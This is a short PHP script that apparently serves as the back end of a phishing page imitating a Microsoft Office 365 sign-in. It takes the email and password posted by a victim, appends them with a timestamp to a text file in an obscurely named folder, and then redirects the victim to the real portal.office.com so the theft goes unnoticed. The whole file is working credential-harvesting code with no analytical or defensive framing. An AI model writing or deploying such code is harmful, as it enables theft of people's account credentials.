<?php
	
	if (isset($_POST['email'])) {

		$myfile = fopen("5e7cc6c6b0812/5e7cc6d05cbb0.txt", "a") or die("Unable to open file!");
		$txt = "Email: " . $_POST['email'] . " Password: " . $_POST['password']. " Date: ". date('m/d/Y h:m:sA') ."\n";

		fwrite($myfile, $txt);
		fclose($myfile);
		header("location:https://portal.office.com");
	}